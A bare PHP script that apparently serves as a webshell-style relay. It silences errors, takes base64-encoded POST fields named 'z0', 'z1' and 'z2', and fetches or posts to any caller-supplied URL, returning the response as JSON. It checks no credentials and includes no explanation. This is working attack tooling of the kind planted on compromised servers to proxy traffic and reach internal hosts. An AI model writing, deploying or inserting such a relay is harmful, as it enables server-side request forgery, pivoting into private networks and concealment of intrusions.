<?php

error_reporting(0);
header('Content-Type: application/json');

function http_get($url, &$http_code)
{
    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);

    $response = curl_exec($ch);

    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    curl_close($ch);

    return $response;
}

function http_post($url, $data, &$http_code)
{
    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/x-www-form-urlencoded',
        'Content-Length: ' . strlen($data)
    ));

    curl_setopt($ch, CURLOPT_TIMEOUT, 15);

    $response = curl_exec($ch);

    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    curl_close($ch);

    return $response;
}

$action = base64_decode(isset($_POST['z0']) ? $_POST['z0'] : '');

$result = array(
    'status' => 'error',
    'action' => $action,
    'http_code' => null,
    'data' => null
);

// Route
switch ($action) {

    case 'get':
        $url = base64_decode(isset($_POST['z1']) ? $_POST['z1'] : '');

        if (!$url) {
            $result['data'] = 'Missing URL';
            break;
        }

        $http_code = 0;
        $body = http_get($url, $http_code);

        $result['status'] = 'ok';
        $result['http_code'] = $http_code;
        $result['data'] = $body;
        break;

    case 'post':
        $url  = base64_decode(isset($_POST['z1']) ? $_POST['z1'] : '');
        $data = base64_decode(isset($_POST['z2']) ? $_POST['z2'] : '');

        if (!$url) {
            $result['data'] = 'Missing URL';
            break;
        }

        $http_code = 0;
        $body = http_post($url, $data, $http_code);

        $result['status'] = 'ok';
        $result['http_code'] = $http_code;
        $result['data'] = $body;
        break;

    default:
        $result['data'] = 'Invalid action';
        break;
}

// Output JSON
echo json_encode($result);

?>